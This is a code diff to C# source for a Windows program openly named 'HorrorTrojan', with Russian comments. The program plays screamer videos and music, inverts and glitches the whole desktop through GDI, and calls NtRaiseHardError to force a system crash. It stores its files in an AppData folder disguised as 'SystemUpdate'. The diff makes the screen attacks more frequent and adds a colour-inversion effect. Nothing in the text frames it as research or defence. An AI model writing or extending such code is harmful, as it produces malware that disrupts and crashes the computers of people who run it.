@@ -33,6 +33,7 @@ namespace HorrorTrojan
         [StructLayout(LayoutKind.Sequential)]
         public struct RECT { public int Left, Top, Right, Bottom; }
         private const int NORMAL = 0x00CC0020;
+        private const int INVERT = 0x00040000; // Инверсия цветов
 
         private System.Windows.Forms.Timer mainTimer = new System.Windows.Forms.Timer();
         private System.Windows.Forms.Timer glitchTimer = new System.Windows.Forms.Timer();
@@ -45,6 +46,8 @@ namespace HorrorTrojan
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
         private Image gifImage;
         private WindowsMediaPlayer musicPlayer;
+        private bool isDragging = false;
+        private Point dragStartPoint;
 
         private string[] videoFiles = { "vd.gif", "kj.gif", "kf.gif" };
 
@@ -53,7 +56,6 @@ namespace HorrorTrojan
             InitializeComponent();
             this.Load += MainInterface_Load;
 
-            // ПРИНУДИТЕЛЬНЫЙ ПОКАЗ ФОРМЫ
             this.WindowState = FormWindowState.Normal;
             this.Visible = true;
             this.Show();
@@ -61,7 +63,6 @@ namespace HorrorTrojan
             this.Activate();
         }
 
-        // ПЕРЕОПРЕДЕЛЯЕМ CreateParams ДЛЯ ГАРАНТИИ ВИДИМОСТИ
         protected override CreateParams CreateParams
         {
             get
@@ -92,7 +93,6 @@ namespace HorrorTrojan
                 SetupProtection();
                 PlayMusic();
 
-                // ЕЩЁ РАЗ ПРИНУДИТЕЛЬНО ПОКАЗЫВАЕМ
                 this.Visible = true;
                 this.Show();
                 this.BringToFront();
@@ -168,17 +168,16 @@ namespace HorrorTrojan
 
         private void StartTimers()
         {
-            // ОСНОВНОЙ ТАЙМЕР (каждую секунду)
             mainTimer.Interval = 1000;
             mainTimer.Tick += MainTimer_Tick;
             mainTimer.Start();
 
-            // GDI ЭФФЕКТЫ (каждые 30-60 секунд)
-            glitchTimer.Interval = rnd.Next(30000, 60000);
+            // GDI ЭФФЕКТЫ КАЖДЫЕ 5-15 СЕКУНД
+            glitchTimer.Interval = rnd.Next(5000, 15000);
             glitchTimer.Tick += GlitchTimer_Tick;
             glitchTimer.Start();
 
-            // СКРИМЕРЫ (каждые 15-30 секунд)
+            // ВИДЕО КАЖДЫЕ 15-30 СЕКУНД
             videoTimer.Interval = rnd.Next(15000, 30000);
             videoTimer.Tick += VideoTimer_Tick;
             videoTimer.Start();
@@ -207,8 +206,17 @@ namespace HorrorTrojan
             if (!isVideoActive && !isGlitchActive)
             {
                 isGlitchActive = true;
-                glitchTimer.Interval = rnd.Next(15000, 30000); // 15-30 секунд
-                StartGlitchEffect();
+                glitchTimer.Interval = rnd.Next(5000, 15000);
+                
+                // СЛУЧАЙНО ВЫБИРАЕМ ЭФФЕКТ: ОБЫЧНЫЙ ИЛИ ИНВЕРСИЯ
+                if (rnd.Next(0, 3) == 0)
+                {
+                    StartInvertEffect(); // Инверсия цветов
+                }
+                else
+                {
+                    StartGlitchEffect(); // Обычный GDI
+                }
             }
         }
 
@@ -217,7 +225,7 @@ namespace HorrorTrojan
             if (!isGlitchActive && !isVideoActive)
             {
                 isVideoActive = true;
-                videoTimer.Interval = rnd.Next(15000, 30000); // 15-30 секунд
+                videoTimer.Interval = rnd.Next(15000, 30000);
                 ShowRandomVideo();
             }
         }
@@ -256,6 +264,43 @@ namespace HorrorTrojan
                 });
                 glitchThread.IsBackground = true;
                 glitchThread.Start();
+            }
+            catch { }
+        }
+
+        private void StartInvertEffect()
+        {
+            try
+            {
+                glitchTimer.Stop();
+                var invertThread = new Thread(() =>
+                {
+                    try
+                    {
+                        // ИНВЕРСИЯ ЦВЕТОВ НА ВСЁМ ЭКРАНЕ
+                        IntPtr hwnd = GetDesktopWindow();
+                        IntPtr hdc = GetWindowDC(hwnd);
+                        GetWindowRect(hwnd, out RECT rect);
+
+                        for (int i = 0; i < 10; i++)
+                        {
+                            BitBlt(hdc, 0, 0, rect.Right, rect.Bottom, hdc, 0, 0, INVERT);
+                            Thread.Sleep(200);
+                            BitBlt(hdc, 0, 0, rect.Right, rect.Bottom, hdc, 0, 0, INVERT);
+                            Thread.Sleep(200);
+                        }
+
+                        ReleaseDC(hwnd, hdc);
+                    }
+                    catch { }
+                    finally
+                    {
+                        isGlitchActive = false;
+                        glitchTimer.Start();
+                    }
+                });
+                invertThread.IsBackground = true;
+                invertThread.Start();
             }
             catch { }
         }
@@ -322,6 +367,35 @@ namespace HorrorTrojan
                 NtRaiseHardError(0xC0000000 | (uint)(DateTime.UtcNow.Ticks & 0xFFFFF), 0, IntPtr.Zero, IntPtr.Zero, 6, out uint _);
             }
             catch { }
+        }
+
+        // ===== ПЕРЕМЕЩЕНИЕ ФОРМЫ =====
+        private void MainInterface_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Left)
+            {
+                isDragging = true;
+                dragStartPoint = new Point(e.X, e.Y);
+                this.Capture = true;
+            }
+        }
+
+        private void MainInterface_MouseMove(object sender, MouseEventArgs e)
+        {
+            if (isDragging)
+            {
+                Point screenPoint = PointToScreen(e.Location);
+                this.Location = new Point(screenPoint.X - dragStartPoint.X, screenPoint.Y - dragStartPoint.Y);
+            }
+        }
+
+        private void MainInterface_MouseUp(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Left)
+            {
+                isDragging = false;
+                this.Capture = false;
+            }
         }
 
         protected override void WndProc(ref Message m)
